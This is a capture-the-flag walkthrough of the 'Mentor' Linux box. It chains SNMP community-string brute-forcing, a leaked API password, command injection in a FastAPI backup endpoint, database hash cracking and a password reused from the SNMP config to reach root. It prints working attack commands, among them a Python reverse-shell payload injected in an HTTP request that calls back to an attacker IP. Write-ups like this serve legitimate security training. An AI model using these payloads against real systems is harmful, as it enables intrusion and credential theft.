# Mentor
Mentor: A Walkthrough by Mursalin
=============================

Mentor is a medium-difficulty Linux box that challenges you to exploit a FastAPI application and dig into SNMP. We’ll start by brute‑forcing an SNMP community string that reveals more than the default “public” one. Using that extra access, we can read the command lines of running processes and extract a password for the API. With that credential, we obtain an admin JWT, find a backup endpoint susceptible to command injection, and get a shell inside a Docker container. From there, database credentials lead us to password hashes; cracking one gives SSH access to the host. Finally, a password buried in the SNMP configuration gives us root.

Box Info
--------

| Field        | Value |
|--------------|-------|
| Name         | Mentor |
| OS           | Linux |
| Difficulty   | Medium |
| Release      | 10 Dec 2022 |
| Retire       | 11 Mar 2023 |
| User blood   | 01:05:06 (original: irogir) |
| Root blood   | 02:01:10 (original: irogir) |
| Creator      | kavigihan |

Recon
-----

### nmap

A full TCP port scan shows two services:

```bash
mursalin@kali$ nmap -p- --min-rate 10000 10.10.11.150
...
22/tcp open  ssh
80/tcp open  http
```

A deeper service scan reveals an Ubuntu box:

```bash
mursalin@kali$ nmap -p 22,80 -sCV 10.10.11.150
...
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header:
|   Apache/2.4.52 (Ubuntu)
|_  uvicorn
|_http-title: Site doesn't have a title (application/json).
Service Info: Host: mentorquotes.htb; OS: Linux
```

Based on the OpenSSH and Apache versions, this is likely Ubuntu 22.04 (Jammy).

UDP scanning (which can be slow and finicky) uncovers SNMP:

```bash
mursalin@kali$ nmap -p 161 -sCV -sU 10.10.11.150
...
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-sysdescr: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
```

### mentorquotes.htb – TCP 80

Visiting the IP redirects to `http://mentorquotes.htb`. The site shows some quotes but nothing interactive. The HTTP headers point to a Python application (Werkzeug/2.0.3 Python/3.6.9), likely Flask. A 404 page confirms Flask’s default styling.

Directory brute‑forcing with `feroxbuster` only finds a `server-status` page (403).

**Subdomain fuzz** with `ffuf` discovers an API subdomain:

```bash
mursalin@kali$ ffuf -u http://10.10.11.150 -H "Host: FUZZ.mentorquotes.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 18 -mc all
...
[Status: 404, Size: 22, Words: 2, Lines: 1, Duration: 89ms]
    * FUZZ: api
```

Add it to `/etc/hosts`:

```
10.10.11.150 mentorquotes.htb api.mentorquotes.htb
```

### api.mentorquotes.htb

The root returns a 404 with `Server: uvicorn`, indicating FastAPI. A quick brute‑force reveals several endpoints:

```bash
mursalin@kali$ feroxbuster -u http://api.mentorquotes.htb --no-recursion --methods GET,POST
...
307      GET        0l        0w        0c /admin => /admin/
200      GET       31l       62w      969c /docs
405     POST        1l        3w       31c /docs
307      GET        0l        0w        0c /users => /users/
307      GET        0l        0w        0c /quotes => /quotes/
...
```

- `/docs` – Swagger documentation, revealing endpoints and a contact email `james@mentorquotes.htb`.
- `/admin` – Returns `Authorization header missing`. Adding a dummy header crashes the server, hinting at broken auth handling.
- `/auth/login` and `/auth/signup` exist but require a token for most operations.

Since we lack credentials, SNMP becomes the next logical step.

SNMP – Abusing `internal` Community String
-------------------------------------------

The default SNMP community string `public` returns minimal data. Using `snmpbrute.py` (from the SNMP-Brute repository) we find a second community string, `internal`, that only works with SNMPv2c:

```bash
mursalin@kali$ python /opt/SNMP-Brute/snmpbrute.py -t 10.10.11.150
...
10.10.11.150 : 161      Version (v2c):  internal
10.10.11.150 : 161      Version (v1):   public
10.10.11.150 : 161      Version (v2c):  public
...
```

Now we can do a full SNMP walk. Using `snmpbulkwalk` (much faster than `snmpwalk`) with `-v2c -c internal` dumps a wealth of system information. In the process table, we spot PID 2123 (yours may differ):

```
HOST-RESOURCES-MIB::hrSWRunName.2123 = STRING: "login.py"
HOST-RESOURCES-MIB::hrSWRunPath.2123 = STRING: "/usr/bin/python3"
HOST-RESOURCES-MIB::hrSWRunParameters.2123 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
```

The parameters reveal a password: `kj23sadkj123as0-d213`.

Obtaining a JWT and Admin Access
---------------------------------

Back in the Swagger docs, we try the `/auth/login` endpoint with `james@mentorquotes.htb`, `username: james`, and the discovered password. It returns a JWT.

The API’s Swagger interface is broken for authenticated endpoints, so we switch to Burp Repeater. Adding the token as `Authorization: <JWT>` (without the `Bearer` prefix – the application doesn’t expect it) allows us to call privileged methods. The `/users` endpoint now returns user data, confirming admin rights.

The `/admin` directory was previously brute‑forced, revealing `/admin/check` (unimplemented) and `/admin/backup`. The backup endpoint expects a JSON body with a `path` parameter and always responds `"Done!"`. This reeks of command injection.

Shell as root in Docker
------------------------

We test with a ping:

```json
{"path": "; ping -c 1 10.10.14.6; "}
```

We get an ICMP reply, confirming injection. However, the container is minimal (Alpine‑based, as the Dockerfile later shows). Common reverse shells with `nc` or `bash -c` fail. Python is available, so we use a compact Python PTY shell from revshells.com:

```bash
# On attacker, start listener
mursalin@kali$ nc -lvnp 443

# In Burp, send the payload
POST /admin/backup HTTP/1.1
Host: api.mentorquotes.htb
Authorization: <JWT>
Content-Type: application/json
Content-Length: 152

{"path": ";python -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.6\",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")';"}
```

A root shell (inside the container) appears.

Moving to the Host – `svc` via Database Hashes
------------------------------------------------

The container’s `/app` directory holds the source code. `db.py` discloses a PostgreSQL connection string:

```python
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
```

We upload `chisel` to tunnel the database port:

```bash
# On attacker (listen on 8000)
mursalin@kali$ /opt/chisel/chisel_1.8.1_linux_amd64 server -p 8000 --reverse

# Inside container
/tmp # ./chisel client 10.10.14.6:8000 R:5432:172.22.0.1:5432
```

Now we connect to the PostgreSQL instance:

```bash
mursalin@kali$ psql -h 127.0.0.1 -p 5432 -U postgres
Password: postgres
```

In `mentorquotes_db`, the `users` table contains two rows:

```
 id |         email          |  username   |             password
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
```

The hash for `svc` (`service_acc`) is an MD5 that cracks almost instantly to `123meunomeeivani` (using CrackStation or hashcat).

Armed with this, we SSH into the host:

```bash
mursalin@kali$ sshpass -p '123meunomeeivani' ssh svc@10.10.11.150
svc@mentor:~$ cat user.txt
d8ac2aee************************
```

Root – Finding the SNMPv3 Password
----------------------------------

While enumerating the host as `svc`, we inspect the SNMP configuration (`/etc/snmp/snmpd.conf`). Filtering out comments and empty lines, we see:

```
createUser bootstrap MD5 SuperSecurePassword123__ DES
rouser bootstrap priv
```

The password `SuperSecurePassword123__` works for `james` (using `su james`). James has `sudo` rights to run `/bin/sh` as root (with password required). Since we know the password, we become root:

```bash
james@mentor:/$ sudo /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
e69f189c************************
```

And the box is fully owned.

Conclusion
----------

Mentor is a satisfying chain: brute‑forcing a hidden SNMP community string leaks a password, which unlocks an admin API key; a careless backup endpoint gives Docker RCE; database credentials from the source code lead to a weak user hash; and a plaintext password stored in the SNMP config yields full root. It’s a perfect example of how configuration management systems can quietly hand over the keys to the kingdom.

~ Mursalin
